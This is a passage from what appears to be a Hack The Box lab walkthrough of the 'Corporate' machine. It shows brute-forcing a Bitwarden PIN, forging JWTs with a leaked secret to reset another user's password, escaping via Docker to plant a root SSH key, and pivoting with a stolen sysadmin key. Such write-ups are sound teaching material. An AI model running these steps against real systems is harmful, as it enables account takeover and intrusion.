00005950: 07 00 00 80 04 00 FF FF  66 6F 6C 64 65 72 73 00  ........folders.
00005960: 00 00 00 00 01 00 FF FF  00 00 00 00 13 00 FF FF  ................
00005970: 04 00 00 80 04 00 FF FF  73 65 6E 64 00 00 00 00  ........send....
00005980: 00 00 00 00 08 00 FF FF  0A 00 00 80 04 00 FF FF  ................
00005990: 74 79 70 65 43 6F 75 6E  74 73 00 00 00 00 00 00  typeCounts......
000059A0: 00 00 00 00 00 00 FF FF  05 00 00 80 04 00 FF FF  ................
000059B0: 73 65 6E 64 73 00 00 00  00 00 00 00 01 00 FF FF  sends...........
000059C0: 00 00 00 00 13 00 FF FF  07 00 00 80 04 00 FF FF  ................
000059D0: 63 69 70 68 65 72 73 00  00 00 00 00 08 00 FF FF  ciphers.........
000059E0: 00 00 00 00 13 00 FF FF  08 00 00 80 04 00 FF FF  ................
000059F0: 73 65 6E 64 54 79 70 65  00 00 00 00 08 00 FF FF  sendType........
00005A00: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................

```

The data is a binary format that has some hierarchical structure. Scanning through the hex dump I’ll find the data that matches this line from the Rust code:

```

    let encrypted = json[json["activeUserId"].as_str().unwrap()]["settings"]["pinProtected"]["encrypted"]

```

![image-20240710123215749](/img/image-20240710123215749.png)

The profile information (`let email = json[json["activeUserId"].as_str().unwrap()]["profile"]["email"]`) is also here:

![image-20240710123344103](/img/image-20240710123344103.png)

I didn’t initially notice it here, but the `kdfIterations` is also useful:

![image-20240710123506325](/img/image-20240710123506325.png)

0x927C0 is 600,000.

#### Update Code

I’ll download the Rust code and update it to work in this scenario by hardcoding the email address and encrypted string at the top of `main`:

```

fn main() {
    println!("Testing 4 digit pins from 0000 to 9999");
    let email = "elwin.jones@corporate.htb";
    let salt = SaltString::b64_encode(email.as_bytes()).unwrap();

    let encrypted = "2.V2ahDugC17hDcs1DXTuSIQ==|hjbtch5fmSrnQy0E5Db8WQ==|U0PYls4Yc5nS4Jj/4Ww62NwUHJVTWOfsN/Y4RYAqOHM=";

```

I’ve picked any blob at random because they should all decrypt with the same pin, and the goal at this point is just to get the pin. I can also remove the `env` and `json` imports.

I’ll need to install Rust on this VM (instructions [here](https://www.rust-lang.org/tools/install)). I’ll `cargo build --release` to download the necessary packages, and the release version will be much faster than the debug version:

```

$ cargo build --release
   Compiling cfg-if v1.0.0
   Compiling version_check v0.9.4
   Compiling typenum v1.16.0
   Compiling autocfg v1.1.0
   Compiling libc v0.2.139
   Compiling crossbeam-utils v0.8.14
   Compiling subtle v2.4.1
   Compiling scopeguard v1.1.0
   Compiling rayon-core v1.10.2
   Compiling serde v1.0.152
   Compiling cpufeatures v0.2.5
   Compiling serde_json v1.0.91
   Compiling base64ct v1.5.3
   Compiling itoa v1.0.5
   Compiling ryu v1.0.12
   Compiling either v1.8.0
   Compiling base64 v0.21.0
   Compiling generic-array v0.14.6
   Compiling memoffset v0.7.1
   Compiling crossbeam-epoch v0.9.13
   Compiling crossbeam-channel v0.5.6
   Compiling crossbeam-deque v0.8.2
   Compiling getrandom v0.2.8
   Compiling num_cpus v1.15.0
   Compiling rand_core v0.6.4
   Compiling password-hash v0.4.2
   Compiling rayon v1.6.1
   Compiling block-buffer v0.10.3
   Compiling crypto-common v0.1.6
   Compiling digest v0.10.6
   Compiling hmac v0.12.1
   Compiling sha2 v0.10.6
   Compiling hkdf v0.12.3
   Compiling pbkdf2 v0.11.0
   Compiling bitwarden-pin v0.1.0 (/home/oxdf/hackthebox/corporate-10.10.11.246/bitwarden-pin)
    Finished `release` profile [optimized] target(s) in 3.01s

```

Now run it with `cargo run --release`:

```

oxdf@corum:~/hackthebox/corporate-10.10.11.246/bitwarden-pin$ time cargo run --release
    Finished `release` profile [optimized] target(s) in 0.01s
     Running `target/release/bitwarden-pin`
Testing 4 digit pins from 0000 to 9999
Pin not found

real	0m4.235s
user	1m26.978s
sys	0m0.156s

```

This runs for a few seconds, but does not find a result.

Some searching around the [Bitwarden Source](https://github.com/bitwarden/clients) leads to [this line](https://github.com/bitwarden/clients/blob/aa57260756c8a008601ac2d655cd33e0558743cb/libs/common/src/auth/models/domain/kdf-config.ts#L15):

```

export class PBKDF2KdfConfig {
  static ITERATIONS = new RangeWithDefault(600_000, 2_000_000, 600_000);
  kdfType: KdfType.PBKDF2_SHA256 = KdfType.PBKDF2_SHA256;
  iterations: number;

  constructor(iterations?: number) {
    this.iterations = iterations ?? PBKDF2KdfConfig.ITERATIONS.defaultValue;
  }

```

The default number of iterations is 600,000, not the 100,000 in the Rust code. That matches what I later noticed in the decompressed profile data (of course it has to be there!).

On updating this in the Rust code, it breaks the pin very quickly:

```

$ time cargo run --release
   Compiling bitwarden-pin v0.1.0 (/home/oxdf/onedrive/CTFs/hackthebox/corporate-10.10.11.246/bitwarden-pin)
    Finished `release` profile [optimized] target(s) in 0.32s
     Running `target/release/bitwarden-pin`
Testing 4 digit pins from 0000 to 9999
Pin found: 0239

real	0m0.968s
user	0m14.584s
sys	0m0.157s

```

### Bitwarden Pin Brute Force [Alternative]

The above path was what was available at the time that Corporate released on HTB. A few months later, [this handy repo](https://github.com/JorianWoltjer/bitwarden-pin-bruteforce) was published by JorianWoltjer that shows easier steps to get this pin for both on disk and in memory scenarios for Chrome and Firefox.

The instruction show using the `moz-idb-edit` tool can be used to get JSON data from the snappy-encoded SQLite data:

```

oxdf@hacky$ pipx install git+https://gitlab.com/ntninja/moz-idb-edit.git
  installed package moz-idb-edit 0.2.1, installed using Python 3.11.9
  These apps are now globally available
    - moz-idb-edit
done! ✨ 🌟 ✨  
oxdf@hacky$ moz-idb-edit --dbpath firefox/tr2cgmb6.default-release/storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId\=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite > bitwarden.json
Using database path: firefox/tr2cgmb6.default-release/storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite
oxdf@hacky$ sed -i 's/undefined/null/g' bitwarden.json 

```

Now I have all that data in a JSON file. I’m using `sed` to replace `undefined` with `null` so it’s actually compliant with the JSON standard (and so I can use `jq`):

```

oxdf@hacky$ cat bitwarden.json | jq '. | keys'
[
  "08b3751b-aad5-4616-b1f7-015d3be749db",
  "accountActivity",
  "activeUserId",
  "appId",
  "authenticatedAccounts",
  "global"
]

```

The config is a bit clearer now. The `activeUserId` holds the GUID of that user:

```

oxdf@hacky$ cat bitwarden.json | jq '.activeUserId'
"08b3751b-aad5-4616-b1f7-015d3be749db"

```

Within that GUID, there’s the `profile`, which has the email and the `kdfIterations`:

```

oxdf@hacky$ cat bitwarden.json | jq '.["08b3751b-aad5-4616-b1f7-015d3be749db"].profile'
{
  "convertAccountToKeyConnector": null,
  "email": "elwin.jones@corporate.htb",
  "emailVerified": true,
  "hasPremiumFromOrganization": null,
  "hasPremiumPersonally": true,
  "kdfIterations": 600000,
  "kdfMemory": null,
  "kdfParallelism": null,
  "kdfType": 0,
  "keyHash": "74E71oPZI9vNnoESNkuLlaDTlk1zA/cH5l5XNOLOc4w=",
  "lastSync": "2023-04-13T15:40:27.533Z",
  "name": "Elwin Jones",
  "userId": "08b3751b-aad5-4616-b1f7-015d3be749db",
  "usesKeyConnector": false
}

```

The `kdfType` of 0 is `pbkdf2`, where as 1 would be `argon2`.

The key protected by the pin is in `settings.pinProtected`:

```

oxdf@hacky$ cat bitwarden.json | jq '.["08b3751b-aad5-4616-b1f7-015d3be749db"].settings.pinProtected'
{
  "encrypted": "2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M="
}

```

I’ll `cargo install bitwarden-pin` to get access to this brute force tool, which breaks this pin in half a second:

```

$ time bitwarden-pin --email elwin.jones@corporate.htb --encrypted '2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M='
[INFO] KDF Configuration: Pbkdf2 {
    iterations: 600000,
}
[INFO] Brute forcing PIN from '0000' to '9999'...
[SUCCESS] Pin found: 0239

real	0m0.585s
user	0m13.388s
sys	0m0.040s

```

I could specify the iterations with `-i`, but this tool defaults to 600,000.

### Gitea

#### Get Creds

I’ll find my Mozilla profile directory on my host. Since my VM installed with snap, it’s in `~/snapp/firefox/common/.mozilla`. On Apt installations, it’s likely `~/.mozilla`. I’ll backup my config, and copy in the one from Corporate:

```

oxdf@hacky$ ls
extensions  firefox
oxdf@hacky$ mv firefox/ firefox.old
oxdf@hacky$ cp -r ~/hackthebox/corporate-10.10.11.246/firefox/ .

```

I’ll start Firefox with `--ProfileManager` and it will offer me profiles to chose from:

![image-20240710143145521](/img/image-20240710143145521.png)

`default-release` is the one that has all the stuff, I’ll pick that. I’ll install Bitwarden from the [extension store](https://addons.mozilla.org/en-US/firefox/addon/bitwarden-password-manager/). Once it’s done, it adds a sidebar to the left side of the window:

![image-20240710143232959](/img/image-20240710143232959.png)

I’ll enter the pin and click the “Unlock” button, and after a little while it opens:

![image-20240710142333037](/img/image-20240710142333037.png)

I’ll click Vault and it shows:

![image-20240710142311957](/img/image-20240710142311957.png)

There’s one entry, Git. Clicking loads:

![image-20240710142412241](/img/image-20240710142412241.png)

It has the username, password, TOTP, and the URL of `git.corporate.htb`. The username and password match what I already have for elwin.jones. The TOTP is what’s new here.

#### Find Gitea

I know that there’s a `git.corporate.htb` on the main host, but I haven’t been able to access it. If I guess that 10.9.0.1 is the same host as Corporate, and try from `corporate-workstation`, it still returns the same:

```

elwin.jones@corporate-workstation-04:~$ curl -H "Host: git.corporate.htb" 10.9.0.1
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.21.4.3</center>
</body>
</html>

```

This is weird, as I would expect this host to have access to it (probably an oversight by the author).

However, I can also access 10.9.0.1 from my host over the VPN, and it returns something different:

```

oxdf@hacky$ curl -H "Host: git.corporate.htb" 10.9.0.1
<a href="/explore">See Other</a>.

```

Interestingly, this is an [HTTP 303](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/303) response, which I don’t think I’ve ever run into before.

I’ll update my `hosts` file:

```
10.9.0.1 git.corporate.htb
10.10.11.246 corporate.htb support.corporate.htb sso.corporate.htb people.corporate.htb

```

Now visiting in Firefox, there’s a series of redirects to `git.corporate.htb/explore/repos`:

![image-20240710150829141](/img/image-20240710150829141.png)

#### Logging In

Without being logged in, there’s no repositories. But Bitwarden is now showing that match with the password item. Clicking on the shield in the username field offers it for fill:

![image-20240710150950135](/img/image-20240710150950135.png)

Then it asks for a 2FA code:

![image-20240710152720266](/img/image-20240710152720266.png)

For the code from Bitwarden to work, it’s important that the clock in my VM be in sync with Corporate. I’ll get the time from the VM:

```

oxdf@hacky$ sudo date -s "$(sshpass -p CorporateStarter04041987 ssh elwin.jones@10.9.0.4 "date -d '-4 hours' +'%Y-%m-%d %H:%M:%S'")"
Wed Jul 10 03:25:20 PM EDT 2024

```

The adjustment for 4 hours is the time difference between the UTC output on the VM and the EDT timezone of my VM. When that’s right, I can get a code and login:

![image-20240710152846962](/img/image-20240710152846962.png)

### Website Source

There’s a ton to enumerate here, but I’ll focus on what’s useful to move forward.

#### SSO

The `corporate-sso` repo has the source code for the SSO site:

![image-20240710153142677](/img/image-20240710153142677.png)

I’m curious to see how the SSO password update works. In `src/app.ts`, there’s a route for POST requests to `/reset-password`:

```

app.post("/reset-password", async (req, res) => {
  const CorporateSSO = req.cookies.CorporateSSO ?? "";

  // Redirect not validated
  const user = validateJWT(CorporateSSO);
  if (!user) {
    return res.redirect("/login?redirect=%2fservices");
  }

  const username = `${user.name}.${user.surname}`;

  const result = PasswordValidator.safeParse(req.body);

  if (!result.success)
    return res.redirect("/reset-password?error=" + encodeURIComponent("You must specify a password longer than 8 characters."));

  const { currentPassword, newPassword, confirmPassword } = result.data;

  if (user.requireCurrentPassword) {
    if (!currentPassword) return res.redirect("/reset-password?error=" + encodeURIComponent("Please specify your previous password."));

    const validateExistingPW = await validateLogin(username, currentPassword);

    if (!validateExistingPW) return res.redirect("/reset-password?error=" + encodeURIComponent("Your current password is incorrect."));
  }

  if (newPassword !== confirmPassword)
    return res.redirect("/reset-password?error=" + encodeURIComponent("The passwords you specified do not match!"));

  const passwordReset = await updateLogin(`${user.name}.${user.surname}`, newPassword);

  if (!passwordReset.success) return res.redirect("/reset-password?error=" + encodeURIComponent(passwordReset.error));

  return res.redirect("/reset-password?success=true");
});

```

I noted above that the `requireCurrentPassword` value in the JWT could have to do with password resets, and this shows that is correct. In the success path it calls `updateLogin`. This is imported from `./utils`:

```

import { updateLogin, validateLogin } from "./utils";

```

This function is using LDAP to manage the login:

```

export const updateLogin = async (username: string, password: string): Promise<{ success: true } | { success: false; error: string }> => {
  return new Promise((resolve, reject) => {
    const client = ldap.createClient({
      url: [ldapConfig.server],
      tlsOptions: {},
    });

    client.bind(adminConfig.dn, adminConfig.password, async (err) => {
      if (err) {
        console.error("Failed to bind as admin user", err);
        return resolve({ success: false, error: "Failed to bind to LDAP server." });
      }

      const dn = `uid=${username},ou=Users,dc=corporate,dc=htb`;

      const user = await getUser(client, username);

      if (!user) return resolve({ success: false, error: "Cannot find user entry." });

      if (user.roles.includes("sysadmin")) {
        console.error("Refusing to allow password resets for high privilege accounts");
        return resolve({ success: false, error: "Refusing to process password resets for high privileged accounts." });
      }

      const change = new ldap.Change({
        operation: "replace",
        modification: {
          type: "userPassword",
          values: [hashPassword(password)],
        },
      });

      client.modify(dn, change, (err) => {
        if (err) {
          console.error("Failed to change user password", err);
          resolve({ success: false, error: "Failed to change user password." });
        } else {
          resolve({ success: true });
        }
      });
    });
  });
};

```

The server is `ldap.corporate.htb`:

```

const ldapConfig = {
  server: "ldaps://ldap.corporate.htb",
};

```

That continues the theme of using the same password both for auth to the host and the website.

#### OurPeople

The `ourpeople` repo has a bunch of commits:

The one labeled “Add flash middleware, authmiddleware and auth router” has an interesting addition to `package.json`:

![image-20240710154006400](/img/image-20240710154006400.png)

That could be a leak of the JWT secret, which would allow me to forge cookies for the site. To verify, I’ll drop into Python:

```

>>> secret = "09cb527651c4bd385483815627e6241bdf40042a"
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAyMSwibmFtZSI6IkVsd2luIiwic3VybmFtZSI6IkpvbmVzIiwiZW1haWwiOiJlbHdpbi5qb25lc0Bjb3Jwb3JhdGUuaHRiIiwicm9sZXMiOlsiaXQiXSwicmVxdWlyZUN1cnJlbnRQYXNzd29yZCI6dHJ1ZSwiaWF0IjoxNzIwNjQwNjIxLCJleHAiOjE3MjA3MjcwMjF9.fk7iWMZRdAGXmFV3N0dFwMysnZLWRCidbpRdmXKRKpU"
>>> jwt.decode(token, secret, algorithms="HS256")
{'id': 5021, 'name': 'Elwin', 'surname': 'Jones', 'email': 'elwin.jones@corporate.htb', 'roles': ['it'], 'requireCurrentPassword': True, 'iat': 1720640621, 'exp': 1720727021}

```

That means the secret is good. If it were not, it would throw an exception.

### Access Docker Socket

#### Find Engineers

I’ll use `getent` ([docs](https://man7.org/linux/man-pages/man1/getent.1.html)) to query LDAP (in this case over `sssd`) to get a list of users in the `engineer` group:

```

elwin.jones@corporate-workstation-04:/$ getent group engineer
engineer:*:502:kian.rodriguez,cathryn.weissnat,ward.pfannerstill,gideon.daugherty,gayle.graham,dylan.schumm,richie.cormier,marge.frami,abbigail.halvorson,arch.ryan

```

I’ll need the user’s ID, which `getent` can return as well:

```

elwin.jones@corporate-workstation-04:/$ getent passwd kian.rodriguez
kian.rodriguez:*:5003:5003:Kian Rodriguez:/home/guests/kian.rodriguez:/bin/bash

```

I could also click around on the website until I find an engineer:

![image-20240710160142557](/img/image-20240710160142557.png)

#### Forge Token

I’ll use Python to create a new JWT for Kian Rodriguez:

```

>>> data = {'id': 5003, 'name': 'Kian', 'surname': 'Rodriguez', 'email': 'kian.rodriguez@corporate.htb', 'roles': ['engineer'], 'requireCurrentPassword': True, 'iat': 1720640621, 'exp': 1720727021}
>>> jwt.encode(data, secret)
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwMywibmFtZSI6IktpYW4iLCJzdXJuYW1lIjoiUm9kcmlndWV6IiwiZW1haWwiOiJraWFuLnJvZHJpZ3VlekBjb3Jwb3JhdGUuaHRiIiwicm9sZXMiOlsiZW5naW5lZXIiXSwicmVxdWlyZUN1cnJlbnRQYXNzd29yZCI6dHJ1ZSwiaWF0IjoxNzIwNjQwNjIxLCJleHAiOjE3MjA3MjcwMjF9._MFDK8IZ6GRKAGoERedXKIjR1bzDMxZ1dcTB-GYl5Iw'

```

When I add this to Firefox and refresh, it’s now authed as Kian:

![image-20240710160841172](/img/image-20240710160841172.png)

On the SSO site, the password reset page still requires I know the original password:

![image-20240710160938489](/img/image-20240710160938489.png)

#### Modify requireCurrentPassword

I’ll forge another JWT, this time changing `requireCurrentPassword` to `False`:

```

>>> data = {'id': 5003, 'name': 'Kian', 'surname': 'Rodriguez', 'email': 'kian.rodriguez@corporate.htb', 'roles': ['engineer'], 'requireCurrentPassword': False, 'iat': 1720640621, 'exp': 1720727021}
>>> jwt.encode(data, secret)
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwMywibmFtZSI6IktpYW4iLCJzdXJuYW1lIjoiUm9kcmlndWV6IiwiZW1haWwiOiJraWFuLnJvZHJpZ3VlekBjb3Jwb3JhdGUuaHRiIiwicm9sZXMiOlsiZW5naW5lZXIiXSwicmVxdWlyZUN1cnJlbnRQYXNzd29yZCI6ZmFsc2UsImlhdCI6MTcyMDY0MDYyMSwiZXhwIjoxNzIwNzI3MDIxfQ.O0jRNEII-xUoHy9VULMrXMETIOroaiMYkZ770jhH7EI'

```

On adding this to Firefox and refreshing, the page no longer requests the current password:

![image-20240710161055058](/img/image-20240710161055058.png)

I’ll change it and submit:

![image-20240710161112717](/img/image-20240710161112717.png)

#### SSH

The password still doesn’t work on the host machine:

```

oxdf@hacky$ sshpass -p 0xdf0xdf ssh kian.rodriguez@10.9.0.1
Warning: Permanently added '10.9.0.1' (ED25519) to the list of known hosts.
Permission denied, please try again.

```

But it does on the workstation:

```

oxdf@hacky$ sshpass -p 0xdf0xdf ssh kian.rodriguez@10.9.0.4
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
...[snip]...
kian.rodriguez@corporate-workstation-04:~$

```

And kian.rodriguez is in the engineer group:

```

kian.rodriguez@corporate-workstation-04:~$ id
uid=5003(kian.rodriguez) gid=5003(kian.rodriguez) groups=5003(kian.rodriguez),502(engineer)

```

And can run Docker commands:

```

kian.rodriguez@corporate-workstation-04:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

```

### Docker Escalation

#### Upload Image

Not only are there no running containers, there are no images on the host:

```

kian.rodriguez@corporate-workstation-04:~$ docker images
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE    

```

I’ll need to get on onto the VM. I’ll start by pulling Alpine (because it’s small) to my VM:

```

oxdf@hacky$ docker pull alpine
Using default tag: latest
latest: Pulling from library/alpine
ec99f8b99825: Pull complete 
Digest: sha256:b89d9c93e9ed3597455c90a0b88a8bbb5cb7188438f70953fede212a0c4394e0
Status: Downloaded newer image for alpine:latest
docker.io/library/alpine:latest

What's Next?
  1. Sign in to your Docker account → docker login
  2. View a summary of image vulnerabilities and recommendations → docker scout quickview alpine

```

`docker save` will save that image to a file:

```

oxdf@hacky$ docker save -o alpine.docker alpine

```

Upload it to the VM:

```

oxdf@hacky$ sshpass -p '0xdf0xdf' scp alpine.docker kian.rodriguez@10.9.0.4:~/

```

And load it:

```

kian.rodriguez@corporate-workstation-04:~$ docker load -i alpine.docker 
94e5f06ff8e3: Loading layer  8.083MB/8.083MB
Loaded image: alpine:latest
kian.rodriguez@corporate-workstation-04:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    a606584aa9aa   2 weeks ago   7.8MB

```

#### Access Root Filesystem

I’ll start the container mounting the root of the host file system into the container at `/host`:

```

kian.rodriguez@corporate-workstation-04:~$ docker run --rm -it -v /:/host alpine /bin/sh
/ # 

```

It works:

```

/host # ls
bin         etc         lib32       lost+found  opt         run         srv         usr
boot        home        lib64       media       proc        sbin        sys         var
dev         lib         libx32      mnt         root        snap        tmp

```

#### SSH

I’ll write my public SSH key into the `authorized_keys` file for root:

```

/host/root/.ssh # echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys

```

Now I can SSH into the box as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.9.0.4
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
...[snip]...
root@corporate-workstation-04:~#

```

## Shell as sysadmin on Corporate

### Enumeration

#### Identify Groups

There’s not much else on this host. I do have access to all the users now, so it’s worth looking at which ones might be of interest.

To look for groups of interest, I’ll use this `bash` loop to run `id` for each user 5001-5078 (as discovered above). The `id` command first has a `,` between the groups, so I’ll split on that and get any groups after the first (to exclude the group that matches the username), and then use `sort` and `uniq` to get a list of groups:

```

root@corporate-workstation-04:~# for i in $(seq 5001 5078); do id $(id -un $i) | cut -d, -f2-; done | sort | uniq -c 
     10 501(finance)
     10 502(engineer)
     12 503(it)
      2 503(it),500(sysadmin)
     20 504(consultant)
     14 505(hr)
     10 506(sales)

```

Two users are in `sysadmin`, which is interesting for sure. I’ll get their names:

```

root@corporate-workstation-04:~# for i in $(seq 5001 5078); do id $(id -un $i); done | grep sysadmin
uid=5007(stevie.rosenbaum) gid=5007(stevie.rosenbaum) groups=5007(stevie.rosenbaum),503(it),500(sysadmin)
uid=5015(amie.torphy) gid=5015(amie.torphy) groups=5015(amie.torphy),503(it),500(sysadmin)

```

#### stevie.rosenbaum

I’ll drop to a shell as stevie.rosenbaum:

```

root@corporate-workstation-04:~# su - stevie.rosenbaum
stevie.rosenbaum@corporate-workstation-04:~$

```

They have an SSH keypair and a `config` file:

```

stevie.rosenbaum@corporate-workstation-04:~/.ssh$ ls
config  id_rsa  id_rsa.pub  known_hosts  known_hosts.old

```

The `config` file shows that they can SSH as the sysadmin user into `corporate.htb`:

```

stevie.rosenbaum@corporate-workstation-04:~/.ssh$ cat config 
Host mainserver
    HostName corporate.htb
    User sysadmin

```

### SSH

#### From corporate-workstation

I can make use of this config and SSH from here to the main server:

```

stevie.rosenbaum@corporate-workstation-04:~/.ssh$ ssh mainserver 
Linux corporate 5.15.131-1-pve #1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64
...[snip]...
sysadmin@corporate:~$

```

#### From My Host

I can bring a copy of the private key back to my host. SSH isn’t accessible directly, but is over the VPN:

```

oxdf@hacky$ ssh -i ~/keys/corporate-sysadmin sysadmin@10.9.0.1
Linux corporate 5.15.131-1-pve #1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64
...[snip]...
sysadmin@corporate:~$ 

```

## Shell as root

### Enumeration

#### Users

sysadmin’s home directory has the same `user.txt`, but not much else:

```

sysadmin@corporate:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .local  .profile  .ssh  user.txt

```

There are two other directories in `/home`:

```

sysadmin@corporate:/home$ ls
git  guests  sysadmin

```

That matches with users `/etc/passwd`:

```

sysadmin@corporate:~$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
git:x:113:119:Git Version Control,,,:/home/git:/bin/bash
sysadmin:x:1000:1000::/home/sysadmin:/bin/bash

```

`git` is completely empty except for a `.ssh` directory that sysadmin can’t access:

```

sysadmin@corporate:/home$ find git/
git/
git/.ssh
find: ‘git/.ssh’: Permission denied

```

`guest` contains all the home directories for the users that get mapped onto `corporate-workstation`:

```

sysadmin@corporate:/home$ ls guests/
abbigail.halvorson  candido.mcdermott  gideon.daugherty   larissa.wilkinson     raphael.adams
abigayle.kessler    cathryn.weissnat   halle.keeling      laurie.casper         richie.cormier
adrianna.stehr      cecelia.west       harley.ratke       leanne.runolfsdottir  rosalee.schmitt
ally.effertz        christian.spencer  hector.king        lila.mcglynn          ross.leffler
america.kirlin      dangelo.koch       hermina.leuschke   mabel.koepp           sadie.greenfelder
amie.torphy         dayne.ruecker      jacey.bernhard     marcella.kihn         scarlett.herzog
anastasia.nader     dessie.wolf        jammie.corkery     margarette.baumbach   skye.will
annamarie.flatley   dylan.schumm       josephine.hermann  marge.frami           stephen.schamberger
antwan.bernhard     elwin.jones        joy.gorczany       michale.jakubowski    stevie.rosenbaum
arch.ryan           elwin.mills        julio.daniel       mohammed.feeney       tanner.kuvalis
august.gottlieb     erna.lindgren      justyn.beahan      morris.lowe           uriel.hahn
bethel.hessel       esperanza.kihn     kacey.krajcik      nora.brekke           veda.kemmer
beth.feest          estelle.padberg    kasey.walsh        nya.little            ward.pfannerstill
brody.wiza          estrella.wisoky    katelin.keeling    oleta.gutmann         zaria.kozey
callie.goldner      garland.denesik    katelyn.swift      penelope.mcclure
candido.hackett     gayle.graham       kian.rodriguez     rachelle.langworth

```

#### Filesystem

In `/opt` there’s an installation of Chrome:

```

sysadmin@corporate:/opt/google/chrome$ ls
chrome                     icudtl.dat                         nacl_helper            product_logo_64.png
chrome_100_percent.pak     libEGL.so                          nacl_helper_bootstrap  resources.pak
chrome_200_percent.pak     libGLESv2.so                       nacl_irt_x86_64.nexe   v8_context_snapshot.bin
chrome_crashpad_handler    liboptimization_guide_internal.so  product_logo_128.png   vk_swiftshader_icd.json
chrome-management-service  libqt5_shim.so                     product_logo_16.png    WidevineCdm
chrome-sandbox             libqt6_shim.so                     product_logo_24.png    xdg-mime
cron                       libvk_swiftshader.so               product_logo_256.png   xdg-settings
default-app-block          libvulkan.so.1                     product_logo_32.png
default_apps               locales                            product_logo_32.xpm
google-chrome              MEIPreload                         product_logo_48.png

```

Could be worth looking at, but most likely just used for the HTML injection earlier in the box.

There are a bunch of files in `/var/backups` that are readable:

```

sysadmin@corporate:/var/backups$ ls -l
total 62720
-rw-r--r-- 1 root root    51200 Jul  8 06:25 alternatives.tar.0
-rw-r--r-- 1 root root     2415 Apr  9  2023 alternatives.tar.1.gz
-rw-r--r-- 1 root root     6302 Nov 27  2023 apt.extended_states.0
-rw-r--r-- 1 root root      782 Apr 12  2023 apt.extended_states.1.gz
-rw-r--r-- 1 root root      766 Apr  8  2023 apt.extended_states.2.gz
-rw-r--r-- 1 root root      256 Apr  8  2023 apt.extended_states.3.gz
-rw-r--r-- 1 root root        0 Jul  8 06:25 dpkg.arch.0
-rw-r--r-- 1 root root       32 Apr 16  2023 dpkg.arch.1.gz
-rw-r--r-- 1 root root       32 Apr 15  2023 dpkg.arch.2.gz
-rw-r--r-- 1 root root       32 Apr  9  2023 dpkg.arch.3.gz
-rw-r--r-- 1 root root      261 Apr  7  2023 dpkg.diversions.0
-rw-r--r-- 1 root root      160 Apr  7  2023 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      160 Apr  7  2023 dpkg.diversions.2.gz
-rw-r--r-- 1 root root      160 Apr  7  2023 dpkg.diversions.3.gz
-rw-r--r-- 1 root root      332 Nov  7  2023 dpkg.statoverride.0
-rw-r--r-- 1 root root      209 Apr  7  2023 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root      209 Apr  7  2023 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root      209 Apr  7  2023 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root   704263 Dec 11  2023 dpkg.status.0
-rw-r--r-- 1 root root   187244 Apr 15  2023 dpkg.status.1.gz
-rw-r--r-- 1 root root   186927 Apr 12  2023 dpkg.status.2.gz
-rw-r--r-- 1 root root   186448 Apr  8  2023 dpkg.status.3.gz
-rw-r--r-- 1 root root 62739772 Apr 15  2023 proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz
-rw-r--r-- 1 root root    76871 Apr 15  2023 pve-host-2023_04_15-16_09_46.tar.gz
drwx------ 3 root root     4096 Apr  7  2023 slapd-2.4.57+dfsg-3+deb11u1
drwxr-xr-x 2 root root     4096 Apr  7  2023 unknown-2.4.57+dfsg-3+deb11u1-20230407-203136.ldapdb

```

The `unknown-2.4.57+dfsg-3+deb11u1-20230407-203136.ldapdb` directory looks like it has a backup of LDAP, but I can’t read the files in it.

The most interesting files are `proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz` and `pve-host-2023_04_15-16_09_46.tar.gz`. Proxmox Virtual Environment (PVE) is the virtualization software that’s probably running the VM on 10.9.0.4. I’ll copy both of these files with `scp`.

#### Proxmox Backup

After decompressing `pve-host-2023_04_15-16_09_46.tar.gz`, it looks like a backup of `/etc`:

```

oxdf@hacky$ find etc/ -type f
etc/hostname
etc/cron.monthly/.placeholder
etc/modprobe.d/pve-blacklist.conf
etc/cron.d/zfsutils-linux
etc/cron.d/e2scrub_all
etc/cron.d/.placeholder
etc/cron.hourly/.placeholder
etc/sysctl.conf
etc/lvm/backup/pve
etc/lvm/lvm.conf
etc/lvm/archive/pve_00000-1961737396.vg
etc/lvm/archive/pve_00001-1030367171.vg
etc/lvm/profile/vdo-small.profile
etc/lvm/profile/thin-generic.profile
